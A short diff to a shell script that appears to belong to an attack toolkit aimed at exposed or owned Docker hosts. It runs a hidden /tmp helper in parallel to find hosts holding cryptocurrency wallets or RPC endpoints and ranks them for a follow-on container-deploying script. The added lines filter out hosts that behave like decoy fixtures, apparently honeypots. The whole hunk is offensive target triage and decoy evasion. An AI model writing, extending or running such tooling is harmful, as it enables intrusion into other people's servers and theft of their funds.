@@ -97,6 +97,9 @@ cat dock.owned dock.live dock.seen 2>/dev/null | cut -f1 | tr -d '\r' \
 echo "scanning=$(grep -c . _cf.cand)"
 xargs -P 40 -n 1 sh "${SYSDIR:-/tmp/.sysd}/cryptofind.sh" < _cf.cand > _cf.out 2>/dev/null
 sort -t"$(printf '\t')" -k2 -rn _cf.out -o crypto.list 2>/dev/null || cp _cf.out crypto.list
+# a score-0 line is a proven FIXTURE (it echoed our bogus method back), so drop it: dock.sh
+# walks crypto.list and there is no point spending a container on a host that holds nothing.
+awk -F'\t' '($2 + 0) > 0' crypto.list > _cf.pos 2>/dev/null && mv _cf.pos crypto.list
 echo "crypto_found=$(grep -c . crypto.list)"
 echo "--- HIGH CONFIDENCE (score>=3: a wallet RPC or several chains)"
 awk -F'\t' '$2 >= 3' crypto.list 2>/dev/null | head -25
